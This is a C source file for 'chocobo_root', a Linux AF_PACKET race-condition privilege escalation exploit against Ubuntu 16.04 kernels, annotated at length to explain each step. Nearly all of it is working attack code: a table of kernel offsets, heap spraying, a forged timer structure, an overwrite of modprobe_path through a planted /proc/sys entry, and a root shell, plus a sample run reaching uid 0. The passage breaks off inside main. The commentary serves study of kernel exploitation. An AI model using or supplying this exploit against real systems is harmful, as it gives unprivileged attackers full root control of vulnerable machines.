// An (overly) commented version of rebel's exploit, by Externalist


/*
chocobo_root.c
linux AF_PACKET race condition exploit
exploit for Ubuntu 16.04 x86_64

vroom vroom
*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=
user@ubuntu:~$ uname -a
Linux ubuntu 4.4.0-51-generic #72-Ubuntu SMP Thu Nov 24 18:29:54 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
user@ubuntu:~$ id
uid=1000(user) gid=1000(user) groups=1000(user)
user@ubuntu:~$ gcc chocobo_root.c -o chocobo_root -lpthread
user@ubuntu:~$ ./chocobo_root
linux AF_PACKET race condition exploit by rebel
kernel version: 4.4.0-51-generic #72
proc_dostring = 0xffffffff81088090
modprobe_path = 0xffffffff81e48f80
register_sysctl_table = 0xffffffff812879a0
set_memory_rw = 0xffffffff8106f320
exploit starting
making vsyscall page writable..

new exploit attempt starting, jumping to 0xffffffff8106f320, arg=0xffffffffff600000
sockets allocated
removing barrier and spraying..
version switcher stopping, x = -1 (y = 174222, last val = 2)
current packet version = 0
pbd->hdr.bh1.offset_to_first_pkt = 48
*=*=*=* TPACKET_V1 && offset_to_first_pkt != 0, race won *=*=*=*
please wait up to a few minutes for timer to be executed. if you ctrl-c now the kernel will hang. so don't do that.
closing socket and verifying.......
vsyscall page altered!


stage 1 completed
registering new sysctl..

new exploit attempt starting, jumping to 0xffffffff812879a0, arg=0xffffffffff600850
sockets allocated
removing barrier and spraying..
version switcher stopping, x = -1 (y = 30773, last val = 0)
current packet version = 2
pbd->hdr.bh1.offset_to_first_pkt = 48
race not won

retrying stage..
new exploit attempt starting, jumping to 0xffffffff812879a0, arg=0xffffffffff600850
sockets allocated
removing barrier and spraying..
version switcher stopping, x = -1 (y = 133577, last val = 2)
current packet version = 0
pbd->hdr.bh1.offset_to_first_pkt = 48
*=*=*=* TPACKET_V1 && offset_to_first_pkt != 0, race won *=*=*=*
please wait up to a few minutes for timer to be executed. if you ctrl-c now the kernel will hang. so don't do that.
closing socket and verifying.......
sysctl added!

stage 2 completed
binary executed by kernel, launching rootshell
root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root),1000(user)

*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=

There are offsets included for older kernels, but they're untested
so be aware that this exploit will probably crash kernels older than 4.4.

tested on:
Ubuntu 16.04: 4.4.0-51-generic
Ubuntu 16.04: 4.4.0-47-generic
Ubuntu 16.04: 4.4.0-36-generic
Ubuntu 14.04: 4.4.0-47-generic #68~14.04.1-Ubuntu

Shoutouts to:
jsc for inspiration (https://www.youtube.com/watch?v=x4UDIfcYMKI)
mcdelivery for delivering hotcakes and coffee

11/2016
by rebel
*/

#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/wait.h>
#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <linux/if_packet.h>
#include <pthread.h>
#include <linux/sched.h>
#include <netinet/tcp.h>
#include <sys/syscall.h>
#include <signal.h>
#include <sched.h>
#include <sys/utsname.h>

// This is the barrier for the "setsockopt_thread" and "vers_switcher" function. It blocks execution until a certain condition is satisfied.
volatile int barrier = 1;
// This is the barrier for the "try_exploit" function. It blocks execution until a certain condition is satisfied.
volatile int vers_switcher_done = 0;

struct offset {
    char *kernel_version;
    unsigned long proc_dostring;
    unsigned long modprobe_path;
    unsigned long register_sysctl_table;
    unsigned long set_memory_rw;
};


struct offset *off = NULL;

//99% of these offsets haven't actually been tested :)

// KASLR is implemented in the kernel, but because some Ubuntu users use hibernation mode, KASLR is turned off by default.
// In it's current state, KASLR and hibernation mode cannot coexist.
// Therefore, static function offsets can be used for the exploit instead of obtaining a kernel infoleak primitive.
struct offset offsets[] = {
    {"4.4.0-46-generic #67~14.04.1",0xffffffff810842f0,0xffffffff81e4b100,0xffffffff81274580,0xffffffff8106b880},
    {"4.4.0-47-generic #68~14.04.1",0,0,0,0},
    {"4.2.0-41-generic #48",0xffffffff81083470,0xffffffff81e48920,0xffffffff812775c0,0xffffffff8106c680},
    {"4.8.0-22-generic #24",0xffffffff8108ab70,0xffffffff81e47880,0xffffffff812b34b0,0xffffffff8106f0d0},
    {"4.2.0-34-generic #39",0xffffffff81082080,0xffffffff81c487e0,0xffffffff81274490,0xffffffff8106b5d0},
    {"4.2.0-30-generic #36",0xffffffff810820d0,0xffffffff81c487e0,0xffffffff812744e0,0xffffffff8106b620},
    {"4.2.0-16-generic #19",0xffffffff81081ac0,0xffffffff81c48680,0xffffffff812738f0,0xffffffff8106b110},
    {"4.2.0-17-generic #21",0,0,0,0},
    {"4.2.0-18-generic #22",0,0,0,0},
    {"4.2.0-19-generic #23~14.04.1",0xffffffff8107d640,0xffffffff81c497c0,0xffffffff8125de30,0xffffffff81067750},
    {"4.2.0-21-generic #25~14.04.1",0,0,0,0},
    {"4.2.0-30-generic #36~14.04.1",0xffffffff8107da40,0xffffffff81c4a8e0,0xffffffff8125dd40,0xffffffff81067b20},
    {"4.2.0-27-generic #32~14.04.1",0xffffffff8107dbe0,0xffffffff81c498c0,0xffffffff8125e420,0xffffffff81067c60},
    {"4.2.0-36-generic #42",0xffffffff81083430,0xffffffff81e488e0,0xffffffff81277380,0xffffffff8106c680},
    {"4.4.0-22-generic #40",0xffffffff81087d40,0xffffffff81e48f00,0xffffffff812864d0,0xffffffff8106f370},
    {"4.2.0-18-generic #22~14.04.1",0xffffffff8107d620,0xffffffff81c49780,0xffffffff8125dd10,0xffffffff81067760},
    {"4.4.0-34-generic #53",0xffffffff81087ea0,0xffffffff81e48f80,0xffffffff81286ed0,0xffffffff8106f370},
    {"4.2.0-22-generic #27",0xffffffff81081ad0,0xffffffff81c486c0,0xffffffff81273b20,0xffffffff8106b100},
    {"4.2.0-23-generic #28",0,0,0,0},
    {"4.2.0-25-generic #30",0,0,0,0},
    {"4.4.0-36-generic #55",0xffffffff81087ea0,0xffffffff81e48f80,0xffffffff81286e50,0xffffffff8106f360},
    {"4.2.0-42-generic #49",0xffffffff81083490,0xffffffff81e489a0,0xffffffff81277870,0xffffffff8106c680},
    {"4.4.0-31-generic #50",0xffffffff81087ea0,0xffffffff81e48f80,0xffffffff81286e90,0xffffffff8106f370},
    {"4.4.0-22-generic #40~14.04.1",0xffffffff81084250,0xffffffff81c4b080,0xffffffff81273de0,0xffffffff8106b9d0},
    {"4.2.0-38-generic #45",0xffffffff810833d0,0xffffffff81e488e0,0xffffffff81277410,0xffffffff8106c680},
    {"4.4.0-45-generic #66",0xffffffff81087fc0,0xffffffff81e48f80,0xffffffff812874c0,0xffffffff8106f320},
    {"4.2.0-36-generic #42~14.04.1",0xffffffff8107ffd0,0xffffffff81c499e0,0xffffffff81261ea0,0xffffffff81069d00},
    {"4.4.0-45-generic #66~14.04.1",0xffffffff81084260,0xffffffff81e4b100,0xffffffff81274340,0xffffffff8106b880},
    {"4.2.0-22-generic #27~14.04.1",0xffffffff8107d640,0xffffffff81c497c0,0xffffffff8125deb0,0xffffffff81067750},
    {"4.2.0-25-generic #30~14.04.1",0,0,0,0},
    {"4.2.0-23-generic #28~14.04.1",0,0,0,0},
    {"4.4.0-46-generic #67",0xffffffff81088040,0xffffffff81e48f80,0xffffffff81287800,0xffffffff8106f320},
    {"4.4.0-47-generic #68",0,0,0,0},
    {"4.4.0-34-generic #53~14.04.1",0xffffffff81084160,0xffffffff81c4b100,0xffffffff81273c40,0xffffffff8106b880},
    {"4.4.0-36-generic #55~14.04.1",0xffffffff81084160,0xffffffff81c4b100,0xffffffff81273c60,0xffffffff8106b890},
    {"4.4.0-31-generic #50~14.04.1",0xffffffff81084160,0xffffffff81c4b100,0xffffffff81273c20,0xffffffff8106b880},
    {"4.2.0-38-generic #45~14.04.1",0xffffffff8107fdc0,0xffffffff81c4a9e0,0xffffffff81261540,0xffffffff81069bf0},
    {"4.2.0-35-generic #40",0xffffffff81083430,0xffffffff81e48860,0xffffffff81277240,0xffffffff8106c680},
    {"4.4.0-24-generic #43~14.04.1",0xffffffff81084120,0xffffffff81c4b080,0xffffffff812736f0,0xffffffff8106b880},
    {"4.4.0-21-generic #37",0xffffffff81087cf0,0xffffffff81e48e80,0xffffffff81286310,0xffffffff8106f370},
    {"4.2.0-34-generic #39~14.04.1",0xffffffff8107dc50,0xffffffff81c498e0,0xffffffff8125e830,0xffffffff81067c90},
    {"4.4.0-24-generic #43",0xffffffff81087e60,0xffffffff81e48f00,0xffffffff812868f0,0xffffffff8106f370},
    {"4.4.0-21-generic #37~14.04.1",0xffffffff81084220,0xffffffff81c4b000,0xffffffff81273a30,0xffffffff8106b9d0},
    {"4.2.0-41-generic #48~14.04.1",0xffffffff8107fe20,0xffffffff81c4aa20,0xffffffff812616c0,0xffffffff81069bf0},
    {"4.8.0-27-generic #29",0xffffffff8108ab70,0xffffffff81e47880,0xffffffff812b3490,0xffffffff8106f0d0},
    {"4.8.0-26-generic #28",0,0,0,0},
    {"4.4.0-38-generic #57",0xffffffff81087f70,0xffffffff81e48f80,0xffffffff81287470,0xffffffff8106f360},
    {"4.4.0-42-generic #62~14.04.1",0xffffffff81084260,0xffffffff81e4b100,0xffffffff81274300,0xffffffff8106b880},
    {"4.4.0-38-generic #57~14.04.1",0xffffffff81084210,0xffffffff81e4b100,0xffffffff812742e0,0xffffffff8106b890},
    {"4.4.0-49-generic #70",0xffffffff81088090,0xffffffff81e48f80,0xffffffff81287d40,0xffffffff8106f320},
    {"4.4.0-49-generic #70~14.04.1",0xffffffff81084350,0xffffffff81e4b100,0xffffffff81274b10,0xffffffff8106b880},
    {"4.2.0-21-generic #25",0xffffffff81081ad0,0xffffffff81c486c0,0xffffffff81273aa0,0xffffffff8106b100},
    {"4.2.0-19-generic #23",0,0,0,0},
    {"4.2.0-42-generic #49~14.04.1",0xffffffff8107fe20,0xffffffff81c4aaa0,0xffffffff81261980,0xffffffff81069bf0},
    {"4.4.0-43-generic #63",0xffffffff81087fc0,0xffffffff81e48f80,0xffffffff812874b0,0xffffffff8106f320},
    {"4.4.0-28-generic #47",0xffffffff81087ea0,0xffffffff81e48f80,0xffffffff81286df0,0xffffffff8106f370},
    {"4.4.0-28-generic #47~14.04.1",0xffffffff81084160,0xffffffff81c4b100,0xffffffff81273b70,0xffffffff8106b880},
    {"4.9.0-1-generic #2",0xffffffff8108bbe0,0xffffffff81e4ac20,0xffffffff812b8400,0xffffffff8106f390},
    {"4.8.0-28-generic #30",0xffffffff8108ae10,0xffffffff81e48b80,0xffffffff812b3690,0xffffffff8106f0e0},
    {"4.2.0-35-generic #40~14.04.1",0xffffffff8107fff0,0xffffffff81c49960,0xffffffff81262320,0xffffffff81069d20},
    {"4.2.0-27-generic #32",0xffffffff810820c0,0xffffffff81c487c0,0xffffffff81274150,0xffffffff8106b620},
    {"4.4.0-42-generic #62",0xffffffff81087fc0,0xffffffff81e48f80,0xffffffff812874a0,0xffffffff8106f320},
    {"4.4.0-51-generic #72",0xffffffff81088090,0xffffffff81e48f80,0xffffffff812879a0,0xffffffff8106f320},
//{"4.8.6-300.fc25.x86_64 #1 SMP Tue Nov 1 12:36:38 UTC 2016",0xffffffff9f0a8b30,0xffffffff9fe40940,0xffffffff9f2cfbf0,0xffffffff9f0663b0},
    {NULL,0,0,0,0}
};

// VSYSCALL is always mapped to a static address which isn't affected from ASLR, and both accessible from kernel and userland.
#define VSYSCALL 0xffffffffff600000

#define PAD 64

// I'm not sure why this is defined. It's not actually used in the exploit.
int pad_fds[PAD];

// for creating the new /proc/sys entry.
struct ctl_table {
    const char *procname;
    void *data;
    int maxlen;
    unsigned short mode;
    struct ctl_table *child;
    void *proc_handler;
    void *poll;
    void *extra1;
    void *extra2;
};

#define CONF_RING_FRAMES 1

struct tpacket_req3 tp;
int sfd;
int mapped = 0;

// to create our fake timer_list struct.
struct timer_list {
    void *next;
    void *prev;
    unsigned long           expires;
    void                    (*function)(unsigned long);
    unsigned long           data;
    unsigned int                     flags;
    int                     slack;
};

void *setsockopt_thread(void *arg)
{
    // the program will infinite loop here until we signal it to start the race.
    while(barrier) {
    }
    // This is the syscall responsible for calling the "packet_set_ring" function in kernel, which in turn creates the small race window. During the execution of "packet_set_ring",
    // the packet version will switch once, or twice, or many times, or maybe won't switch at all depending on the decision of the scheduler. We want the switch to fit right inside the small race window.
    // Check here for technical details of the race condition : http://seclists.org/oss-sec/2016/q4/607
    setsockopt(sfd, SOL_PACKET, PACKET_RX_RING, (void*) &tp, sizeof(tp));

    return NULL;
}

void *vers_switcher(void *arg)
{
    int val,x,y;

    // the program will infinite loop here until we signal it to start the race.
    while(barrier) {}

    // The race has begun!
    // The while loop will break out when "swap(rb->pg_vec, pg_vec)" <- this piece of code is executed during the syscall setsockopt(PACKET_RX_RING), and when that happens, the setsockopt in the while loop
    // will return a non-zero value(-EBUSY). The race needs to win after "init_prb_bdqc()" and before "swap(rb->pg_vec, pg_vec)". Read the "packet_set_ring" function source code for details.
    while(1) {
        // Read the TPACKET_V3 comments before reading this.
        //
        // While the kernel is in the "init_prb_bdqc" function with the packet version being TPACKET_V3, a context switch must occur and the packet version must switch to TPACKET_V1 in order to win the race.
        // And as described above, this must happen before "swap(rb->pg_vec, pg_vec)" happens in the "packet_set_ring" function, because if you read the "packet_setsockpot" syscall inplementation,
        // You can see that the syscall will fail on this line "case PACKET_VERSION: { ............ if (po->rx_ring.pg_vec || po->tx_ring.pg_vec) return -EBUSY; ...........". And po->rx_ring.pg_vec is set
        // when "swap(rb->pg_vec, pg_vec)" is executed. So this explains why the race must win between those two code fragments.
        // There is a slim chance that the race has actually won, but the race won once more(!) and the packet version switched back to TPACKET_V3 before the swap macro, hence, the race lost in the end. :(
        // You can simply run "try_exploit()" again until the race wins.
        val = TPACKET_V1;
        x = setsockopt(sfd, SOL_PACKET, PACKET_VERSION, &val, sizeof(val));

        y++;

        if(x != 0) break;

        // Once the kernel enters the "packet_set_ring", it's totally fine to keep switching back and forth packet versions, the function won't bail out because of inconsistencies.
        // In order to win the race, the packet version must be set to TPACKET_V3 right before it enters "switch(po->tp_version) { case TPACKET_V3: ......}", and after that, it starts running the init_prb_bdqc()
        // function to set up the timer. Upon execution, further switching between packet versions is irrelevant and the kernel will happily finish the rest of the function execution and return.
        val = TPACKET_V3;
        x = setsockopt(sfd, SOL_PACKET, PACKET_VERSION, &val, sizeof(val));

        if(x != 0) break;

        y++;
    }

    fprintf(stderr,"version switcher stopping, x = %d (y = %d, last val = %d)\n",x,y,val);

    // "swap(rb->pg_vec, pg_vec)" was executed and setsockopt failed, leaving the while loop. We don't know yet if the race won or not, but the race attempt has finished anyway and
    // "try_exploit" can continue and verify if the race actually won. This switch tells "try_exploit" to continue execution.
    vers_switcher_done = 1;


    return NULL;
}

// This is the buffer to craft our fake "packet_sock" object, which contains our fake "timer_list" object.
#define BUFSIZE 1408
char exploitbuf[BUFSIZE];

void kmalloc(void)
{
    // For kernel versions prior to v4.8, we could have just called the syscall only once. Starting from v4.8 the SLUB allocator freelist is randomized via
    // CONFIG_SLAB_FREELIST_RANDOM(more details here : https://medium.com/@mxatone/randomizing-the-linux-kernel-heap-freelists-b899bb99c767#.qlsgacafa),
    // Therefore, in order to place our fake "packet_sock" object in the UAFed object, we would simply execute the syscall over and over again and hopefully one of the kmallocs will land right in the hole. :)
    // One might question that the kmalloc buffer gets freed by kvfree(payload) at the end of the syscall, however, even if the buffer is freed, the data still remains until another allocation overwrites it.
    while(1)
        // This kmallocs a buffer of user controlled size, and fills it with user supplied data. Really neat heap feng-shui primitive.
        syscall(__NR_add_key, "user","wtf",exploitbuf,BUFSIZE-24,-2);
}


void pad_kmalloc(void)
{
    int x;

    // This is to defragment the heap and fill the holes in the kmalloc-2048 slab. our "packet_sock" object will be placed in this slab.
    for(x=0; x<PAD; x++)
        if(socket(AF_PACKET,SOCK_DGRAM,htons(ETH_P_ARP)) == -1) {
            fprintf(stderr,"pad_kmalloc() socket error\n");
            exit(1);
        }

}

int try_exploit(unsigned long func, unsigned long arg, void *verification_func)
{
    pthread_t setsockopt_thread_thread,a;
    int val;
    socklen_t l;
    struct timer_list *timer;
    int fd;
    struct tpacket_block_desc *pbd;
    int off;
    sigset_t set;

    // Ignoring Segfaults. We want segfaults to be handled in the "modify_vsyscall" function.
    sigemptyset(&set);
    sigaddset(&set, SIGSEGV);
    if(pthread_sigmask(SIG_BLOCK, &set, NULL) != 0) {
        fprintf(stderr,"couldn't set sigmask\n");
        exit(1);
    }

    fprintf(stderr,"new exploit attempt starting, jumping to %p, arg=%p\n",(void *)func,(void *)arg);

    // defragmenting the kernel heap
    pad_kmalloc();

    // Creating our target socket
    fd=socket(AF_PACKET,SOCK_DGRAM,htons(ETH_P_ARP));

    if (fd==-1) {
        printf("target socket error\n");
        exit(1);
    }

    // defragmenting the kernel heap some more
    pad_kmalloc();

    fprintf(stderr,"sockets allocated\n");

    val = TPACKET_V3;

    // Setting initial packet version to TPACKET_V3. This might actually not be needed because due to the scheduler randomness, the while loop in "vers_switcher" might alter the packet version
    // back and forth even before setsockopt(PACKET_RX_RING) actually starts.
    setsockopt(fd, SOL_PACKET, PACKET_VERSION, &val, sizeof(val));

    // This is to initialize the tpacket_req3 struct that gets passed to setsockopt(PACKET_RX_RING). The reason behind this is explained later.
    // See here for an example on how to setup ring buffers in socket operations : https://gist.github.com/giannitedesco/5863705
    tp.tp_block_size = CONF_RING_FRAMES * getpagesize();
    tp.tp_block_nr = 1;
    tp.tp_frame_size = getpagesize();
    tp.tp_frame_nr = CONF_RING_FRAMES;

    //try to set the timeout to 10 seconds
    //the default timeout might still be used though depending on when the race was won
    tp.tp_retire_blk_tov = 10000;

    sfd = fd;

    // Creating the thread that executes the first piece of the puzzle "setsockopt(sfd, SOL_PACKET, PACKET_RX_RING, (void*) &tp, sizeof(tp));"
    if(pthread_create(&setsockopt_thread_thread, NULL, setsockopt_thread, (void *)NULL)) {
        fprintf(stderr, "Error creating thread\n");
        return 1;
    }

    // Creating the thread that executes the second piece of the puzzle. These two threads will be blocked until the "barrier" variable is released.
    pthread_create(&a, NULL, vers_switcher, (void *)NULL);

    // Give some time for the thread initialization to finish.
    usleep(200000);

    fprintf(stderr,"removing barrier and spraying..\n");

    memset(exploitbuf,'\x00',BUFSIZE);

    // This is where it's crafting the fake "timer_list" object. Actually, the exploitbuf represents the "packet_sock" object, but that object in turns contain the "timer_list" object.
    // See the definition of the "packet_sock" object for details. You should follow the stucture tree like this : packet_sock->rx_ring->prb_bdqc->retire_blk_timer
    // "exploitbuf+(0x6c*8)+6-8" represents the exact offset of the "timer_list" within the "packet_sock" object.
    // Now crafting our fake "timer_list" object...
    timer = (struct timer_list *)(exploitbuf+(0x6c*8)+6-8);
    timer->next = 0;
    timer->prev = 0;

    // just setting this to a random big value.
    timer->expires = 4294943360;
    // this is the most important member. This in turn will execute any function of our choice within the kernel
    timer->function = (void *)func;
    // along with any argument we provide. This creates a powerful call_any_function(crafted_data); primitive to work with. We still need to find a useful function that accepts at most 1 function argument.
    timer->data = arg;
    timer->flags = 1;
    timer->slack = -1;


    // The barrier has been lifted and the race begins! The race will end very briefly as soon as "swap(rb->pg_vec, pg_vec)" <- this is executed within the "packet_set_ring" function.
    barrier = 0;

    // I don't think this is really needed. ;)
    usleep(100000);

    // Wait until the two threads return and the race attempt has finished.
    while(!vers_switcher_done)usleep(100000);

    // Getting our socket's packet version.
    l = sizeof(val);
    getsockopt(sfd, SOL_PACKET, PACKET_VERSION, &val, &l);

    fprintf(stderr,"current packet version = %d\n",val);

    // This is a very clever method to see if the kernel actually reached the "init_prb_bdqc()" function inside the "packet_set_ring" function.
    // There are two conditions that need to be satisfied for this race condition to win. 1. "init_prb_bdqc()" needs to be executed. 2. Upon returning from "packet_set_ring", the packet version must be TPACKET_V1.
    // This piece of code checks for the first condition. Within "init_prb_bdqc()", "prb_open_block" is executed and it sets up the corresponding headers for the packet block descriptors.
    // Specifically, this line "BLOCK_O2FP(pdb1) = (__u32)BLK_PLUS_PRIV.........." sets the "packetblockdescriptor->header.bh1.offset_to_first_pkt" field, and it can be read from userland using the following code.
    pbd = mmap(0, tp.tp_block_size * tp.tp_block_nr, PROT_READ | PROT_WRITE, MAP_SHARED, sfd, 0);
    if(pbd == MAP_FAILED) {
        fprintf(stderr,"could not map pbd\n");
        exit(1);
    }
    else {
        off = pbd->hdr.bh1.offset_to_first_pkt;
        fprintf(stderr,"pbd->hdr.bh1.offset_to_first_pkt = %d\n",off);
    }

    // So if both conditions 1. "init_prb_bdqc()" needs to be executed. 2. Upon returning from "packet_set_ring", the packet version must be TPACKET_V1. are satisfied, we can safely conclude the race won. :)
    if(val == TPACKET_V1 && off != 0) {
        fprintf(stderr,"*=*=*=* TPACKET_V1 && offset_to_first_pkt != 0, race won *=*=*=*\n");
    }

    // If otherwise, bail out.
    else {
        fprintf(stderr,"race not won\n");
        exit(2);
    }

    // We've done our check, we don't need this anymore.
    munmap(pbd, tp.tp_block_size * tp.tp_block_nr);

    // Start our verification function to check if our arbitrary function call has actually succeeded.
    pthread_create(&a, NULL, verification_func, (void *)NULL);

    fprintf(stderr,"please wait up to a few minutes for timer to be executed. if you ctrl-c now the kernel will hang. so don't do that.\n");
    sleep(1);
    fprintf(stderr,"closing socket and verifying..");

    // This might look insignificant, but this is where our "packet_sock" struct gets freed(associated to our target socket), along with the timer_list object!
    // However, since the packet version is now TPACKET_V1, the timer object that was registered to the "timer_list" object still lives in memory and will fire the callback once the timeout expires.
    // Our goal is to fill in the freed "packet_sock" object with our own crafted fake "packet_sock" object, so the zombie timer object will
    // eventually run our "timer->function" callback from our fake timer_list object.
    close(sfd);

    // This is where starts spraying our fake object.
    kmalloc();

    fprintf(stderr,"all messages sent\n");

    // Keep this thread alive to preserve our carefully manipulated heap state.
    sleep(31337);
    exit(1);
}


int verification_result = 0;

// Until the timer callback actually fires, any write to VSYSCALL will fail and SIGSEGV. In such case, catch the SIGSEGV and gracefully return.
void catch_sigsegv(int sig)
{
    // Mark that our fake object callback has not been fired yet.
    verification_result = 0;
    pthread_exit((void *)1);
}


void *modify_vsyscall(void *arg)
{
    unsigned long *vsyscall = (unsigned long *)(VSYSCALL+0x850);
    unsigned long x = (unsigned long)arg;

    sigset_t set;
    sigemptyset(&set);
    sigaddset(&set, SIGSEGV);

    if(pthread_sigmask(SIG_UNBLOCK, &set, NULL) != 0) {
        fprintf(stderr,"couldn't set sigmask\n");
        exit(1);
    }

    // Registering a SIGSEGV handler to catch write access violation on VSYSCALL.
    signal(SIGSEGV, catch_sigsegv);

    // Attempting to write something to VSYSCALL+0x850.
    *vsyscall = 0xdeadbeef+x;

    // Has the value changed?
    if(*vsyscall == 0xdeadbeef+x) {
        fprintf(stderr,"\nvsyscall page altered!\n");
        // Success! Mark a variable to let the caller know.
        verification_result = 1;
        pthread_exit(0);
    }

    return NULL;
}

void verify_stage1(void)
{
    int x;
    pthread_t v_thread;

    sleep(5);

    for(x=0; x<300; x++) {

        pthread_create(&v_thread, NULL, modify_vsyscall, 0);

        pthread_join(v_thread, NULL);

        // exit(0) returns 0 to caller notifying that VSYSCALL is now writable.
        if(verification_result == 1) {
            exit(0);
        }

        // Attempting to write to VSYSCALL every 1 second. Usually it takes only 10 seconds but sometimes it could take up to a couple minutes.
        write(2,".",1);
        sleep(1);
    }

    printf("could not modify vsyscall\n");

    exit(1);
}

void verify_stage2(void)
{
    int x;
    struct stat b;

    // Sleep some, to wait for the timer to expire.
    sleep(5);

    // Same thing as stage one. It's just looping and checking multiple times until the timer callback fires.
    for(x=0; x<300; x++) {

        if(stat("/proc/sys/hack",&b) == 0) {
            fprintf(stderr,"\nsysctl added!\n");
            exit(0);
        }

        write(2,".",1);
        sleep(1);
    }

    // the /proc/sys/hack file hasn't been created. Something bad happened.
    printf("could not add sysctl\n");
    exit(1);


}

void exploit(unsigned long func, unsigned long arg, void *verification_func)
{
    int status;
    int pid;

retry:

    pid = fork();

    if(pid == 0) {
        // attempt to win race and call arbitrary function with arbitrary arguments.
        // Then, execute verify function to check if our function executed correctly.
        try_exploit(func, arg, verification_func);
        exit(1);
    }

    // Waiting until the forked process terminates.
    wait(&status);

    printf("\n");

    // Means the race did not win. Try again.
    if(WEXITSTATUS(status) == 2) {
        printf("retrying stage..\n");
        kill(pid, 9);
        sleep(2);
        goto retry;
    }

    // All other errors go here.
    else if(WEXITSTATUS(status) != 0) {
        printf("something bad happened, aborting exploit attempt\n");
        exit(-1);
    }

    // in case of zombie child process, kill 9
    kill(pid, 9);
}


void wrapper(void)
{
    struct ctl_table *c;

    fprintf(stderr,"exploit starting\n");
    printf("making vsyscall page writable..\n\n");

    // starting stage1
    // If the exploit succeeds, then set_memory_rw(VSYSCALL, ???); will be called when the timer expires.
    // According to this(http://lxr.free-electrons.com/source/arch/x86/mm/pageattr.c#L1716), this effectively gives read/write access to the target page.
    // However, set_memory_rw accepts *two* parameters(int set_memory_rw(unsigned long addr, int numpages)). The timer callback only accepts one.
    // I'm assuming a stray value in the $rsi register is used, and since the second argument is "int numpages", it'll just grant rw accesses to that much pages,
    // which luckily doesn't wrap around the end of the addressspace or OOB, and doesn't really hurt the program functionality. I haven't really checked in a debugger though.
    exploit(off->set_memory_rw, VSYSCALL, verify_stage1);

    printf("\nstage 1 completed\n");

    sleep(5);

    printf("registering new sysctl..\n\n");

    // now that VSYSCALL area is writable from userspace, we start crafting a ctl_table struct that will later be used by
    // "register_sysctl_table" to create our own /proc/sys/hack file that has read/write primitives to a targetted address in the kernel.
    // Note that the VSYSCALL area is readable by both user and kernel space without disturbing SMAP.
    c = (struct ctl_table *)(VSYSCALL+0x850);

    // initializing the ctl_table struct
    memset((char *)(VSYSCALL+0x850), '\x00', 1952);

    // this will be the name of our new /proc/sys file.
    strcpy((char *)(VSYSCALL+0xf00),"hack");
    // I'm not entirely sure what this value(ctl_table->extra1) is used for. It doesn't seem to be used by proc_dostring in the kernel source code.
    memcpy((char *)(VSYSCALL+0xe00),"\x01\x00\x00\x00",4);
    // points to the "hack" string in VSYSCALL.
    c->procname = (char *)(VSYSCALL+0xf00);
    // The file permissions of the new /proc/sys file
    c->mode = 0666;
    // This function simply reads/writes from/to the /proc/sys file to a kernel address pointed by the "ctl_table->data".
    c->proc_handler = (void *)(off->proc_dostring);
    // This will be the target address "proc_dostring" uses. By accessing /proc/sys/hack, a user can read, write arbitrary data to this address.
    c->data = (void *)(off->modprobe_path);
    // Max length of data that can be read/written.
    c->maxlen=256;
    // This might have been left for testing purposes.
    c->extra1 = (void *)(VSYSCALL+0xe00);
    // this also. It seems to be unused.
    c->extra2 = (void *)(VSYSCALL+0xd00);

    // starting stage2
    // According to (http://www.hep.by/gnu/kernel/filesystems/API-register-sysctl-table.html) "register_sysctl_table" only accepts one parameter : 	struct ctl_table * table.
    // This is perfect in terms of our call_any_function(crafted_data); primitive. :)
    exploit(off->register_sysctl_table, VSYSCALL+0x850, verify_stage2);

    printf("stage 2 completed\n");
}

void launch_rootshell(void)
{
    int fd;
    char buf[256];
    struct stat s;


    // opening our newly created /proc/sys entry from stage2
    fd = open("/proc/sys/hack",O_WRONLY);

    if(fd == -1) {
        fprintf(stderr,"could not open /proc/sys/hack\n");
        exit(-1);
    }

    memset(buf,'\x00', 256);

    // get absolute path of "./chocobo_root"
    readlink("/proc/self/exe",(char *)&buf,256);

    // This is effectively overwriting "/sbin/modprobe" with the absolute path to "./chocobo_root"
    // It's okay for the absolute path length to be pretty long, cause there is a lot of unused NULLs after the "/sbin/modprobe" string.
    write(fd,buf,strlen(buf)+1);

    // 132 is IPPROTO_SCTP. By creating a socket, these functions get called in the following order.
    // inet_create -> request_module -> call_modprobe -> call_usermodehelper_setup, call_usermodehelper_exec -> call_usermodehelper_exec_work -> call_usermodehelper_exec_async -> do_execve
    // You can see the modprobe path defaults to "/sbin/modprobe" in call_modprobe. By checking /proc/sys/kernel/modprobe, the path hasn't changed, which doesn't really matter though.
    // "call_usermodehelper_setup" will register a worker which in turn calls "do_execve". Before calling do_execve, the kernel effectively does commit_creds(prepare_kernel_cred(0)); for the
    // to-be-spawned "/sbin/modprobe". However, "/sbin/modprobe" has been overwritten by the absolute path of "./chocobo_root", therefore, ./chocobo_root will be executed with root privileges!
    socket(AF_INET,SOCK_STREAM,132);

    // check if stage3 has been executed, hence, if the binary uid has successfully changed to root.
    if(stat(buf,&s) == 0 && s.st_uid == 0) {
        printf("binary executed by kernel, launching rootshell\n");
        // restoring the "/sbin/modprobe" string in kernel so that the kernel won't collapse at some point.
        lseek(fd, 0, SEEK_SET);
        write(fd,"/sbin/modprobe",15);
        close(fd);
        // launching stage4
        execl(buf,buf,NULL);
    }

    else
        printf("could not create rootshell\n");
}

int main(int argc, char **argv)
{
    int status, pid;
    struct utsname u;
    int i, crash = 0;
    char buf[512], *f;

    // We can do "./chocobo_root crash" just to check if the most basic primitive works properly.
    // That is, fill UAFed packet_sock object(and in turn the timer_list object) with our data, then check if it calls our crafted function pointer.
    // In different kernels and architectures, the structure offset may be shifted a tad bit and this could be useful to build up the most basic function call primitive.
    if(argc == 2 && !strcmp(argv[1],"crash")) {
        crash = 1;
    }


    // This is actually stage3. Instead of "/sbin/modprobe", our exploit "./chocobo_root" will be executed once more, but this time by the kernel itself!
    // Then it's going to chown chgroup "./chocobo_root" to root, then give it a SETUID bit.
    if(getuid() == 0 && geteuid() == 0 && !crash) {
        chown("/proc/self/exe",0,0);
